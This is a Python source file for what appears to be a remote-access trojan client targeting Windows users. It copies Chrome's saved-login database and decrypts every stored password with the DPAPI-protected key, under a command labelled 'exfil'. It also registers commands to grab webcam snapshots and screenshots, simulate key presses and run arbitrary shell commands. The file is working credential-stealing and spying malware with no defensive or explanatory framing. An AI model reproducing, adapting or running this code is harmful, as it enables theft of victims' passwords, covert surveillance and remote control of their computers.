import cv2
import base64
import subprocess
import pynput
import inspect
import mss
import mss.tools
import json
import getpass
import sqlite3
from Cryptodome.Cipher import AES
import win32crypt
from win32gui import *
import shutil
from ws4py.client.threadedclient import WebSocketClient

commands = {}

# sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
# sock.connect(("127.0.0.1", 1720))


# yes this approach is bad it will crash if chrome is not installed 
chrome_path = f"C:\\Users\\{getpass.getuser()}\AppData\\Local\\Google\\Chrome\\User Data\\Default\\Login Data"
encrypt_path = f"C:\\Users\\{getpass.getuser()}\\AppData\\Local\\Google\\Chrome\\User Data\\Local State"
db_copy_path = f"C:\\Users\\{getpass.getuser()}\\AppData\LocalLow\\Microsoft\\Windows\\"
db_read_path = db_copy_path + "Login Data"
shutil.copy(chrome_path, db_copy_path)

# cli = client.Connect("ws://127.0.0.1:8000")

conn = sqlite3.connect(db_read_path)
c = conn.cursor()


def register(alias):
    def inner(func):
        if func.__name__ not in commands:
            commands[alias] = {
                'func_ref': func,
                'args': inspect.getfullargspec(func).args,

            }
        return func

    return inner


class CommandUtils:


    def gen_cipher(self, secret_key, iv):
        return AES.new(secret_key, AES.MODE_GCM, iv)

    def get_passwords(self):
        res = c.execute("SELECT origin_url, username_value, password_value FROM logins")
        return res.fetchall()

    def gen_secret_key(self):
        file = json.loads(open(encrypt_path, "r").read())
        secret_key = base64.b64decode(
            file['os_crypt']["encrypted_key"])[5:]
        new_key = win32crypt.CryptUnprotectData(secret_key, None, None, None, 0)[1]
        return new_key

    def process_passwords(self):
        data = {}

        for uri, username, password in self.get_passwords():
            data[username] = {
                "uri": uri,
                "iv": password[3:15],
                "password": password[15:-16],

            }
        return data

    @register(alias="exfil")
    def decrypt_password(self):
        passwords = self.process_passwords()
        new_data = {}
        for i, l in passwords.items():
            res = self.gen_cipher(self.gen_secret_key(), l['iv'])
            new_data[l['uri']] = {
                "plain_text": res.decrypt(l['password']).decode(),
                "username": i
            }

        return new_data


    @register(alias="stream_on")
    def stream(self, time=9000):
        i = 0
        while i < time:
          #  video = cv2.VideoCapture(0)
           # _, img = video.read()
            yield i
            i+=1 
      
            

    @register(alias="snap")
    def __snapshot(self):
        i, img = cv2.VideoCapture(0, cv2.CAP_DSHOW).read()
        return str(base64.b64encode(img))

    @register(alias="press")
    def __enablePress(self, button):
        pynput.press(button)
        pynput.release()

    @register(alias="screenshot")
    def __screenshot(self, monitor_number=1):
        m = mss.mss()
        monintor1 = m.monitors[monitor_number]
        e = m.grab(monintor1)
        return mss.tools.to_png(e.rgb, e.size)

    def call_func(self, alias, *args, is_sys=False):
        try:
            if is_sys:
                return subprocess.run(
                    args=[alias, *args],
                    shell=True,
                    check=True,
                )
            # idk why but if i dont cast the tuple to an array
            # it will throw the following exception tuple object has no attribute process_passwords
            # idk its like magic
            # hours_wasted=9
            converted = list(args)
            converted.insert(0, self)
            func = commands[alias]['func_ref']
            return func(*converted)
        except (KeyError, TypeError) as e:
            return e


